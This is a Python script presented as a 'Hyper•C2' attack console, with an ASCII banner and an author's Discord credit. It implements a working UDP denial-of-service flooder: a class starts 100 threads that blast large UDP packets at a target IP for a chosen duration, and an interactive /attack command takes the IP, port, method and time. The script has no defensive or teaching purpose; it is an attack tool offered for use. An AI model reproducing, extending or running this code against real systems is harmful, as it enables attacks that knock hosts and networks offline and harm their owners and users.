import os
import socket
import threading
import time
from random import randint

# Banner
banner = """
.##.....##.##....##.########..########.########...######...#######.
.##.....##..##..##..##.....##.##.......##.....##.##....##.##.....##
.##.....##...####...##.....##.##.......##.....##.##..............##
.#########....##....########..######...########..##........#######.
.##.....##....##....##........##.......##...##...##.......##.......
.##.....##....##....##........##.......##....##..##....##.##.......
.##.....##....##....##........########.##.....##..######..#########
"""

info = """
                     Script by: @lulumina
                          power: luxozaion
                        discord: lulumina
"""

methods_text = """
        /methods

        Hyper•C2 >>
        UDPPPS - Flood UDP De alta Frequência
        UDPPACKETS - Pacotes UDP massivos
        UDPKILL - UDP com 1M de pacotes

        Uso: /attack [ip] [port] [method] [time]
"""

# Mostrar banner en consola sin colores
print(banner)

# Mostrar info sin colores
print(info)

# Mostrar métodos sin colores
def show_prompt():
    print(methods_text)

# Clase Brutalize
class Brutalize:
    def __init__(self, ip, port, force=9999, threads=100):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
        self.on = False

    def flood(self, duration):
        self.on = True
        self.sent = 0
        self.total = 0

        for _ in range(self.threads):
            threading.Thread(target=self.send).start()

        info_thread = threading.Thread(target=self.info)
        info_thread.start()

        time.sleep(duration)
        self.on = False
        info_thread.join()

    def info(self):
        interval = 0.05
        now = time.time()
        size = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            time.sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"[i] {round(size)} Mb/s - Total: {round(self.total, 1)} Gb", end='\r')

            now2 = time.time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

# Ejecutar ataque
def launch_attack(ip, port, method, duration):
    valid_methods = ["UDPPPS", "UDPPACKETS", "UDPKILL"]

    if method not in valid_methods:
        print("[!] Método inválido.")
        return

    attack = Brutalize(ip, port, force=9999, threads=100)
    print(f"[+] Ataque iniciado com método {method} por {duration}s")
    attack.flood(duration)
    print("\n[+] Ataque realizado com sucesso!")

# Main loop
def main():
    while True:
        # Prompt: "Hyper" rojo, "•C2 >>" blanco
        print("Hyper•C2 >> ", end="")
        cmd = input().strip()

        if cmd == "/methods":
            show_prompt()

        elif cmd.startswith("/attack"):
            args = cmd.split()
            if len(args) != 5:
                print("[!] Uso: /attack [ip] [port] [method] [time]")
                continue

            ip = args[1]
            port = int(args[2])
            method = args[3].upper()
            duration = int(args[4])

            launch_attack(ip, port, method, duration)

        else:
            print("[!] Comando inválido. Use /methods ou /attack.")


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    main()
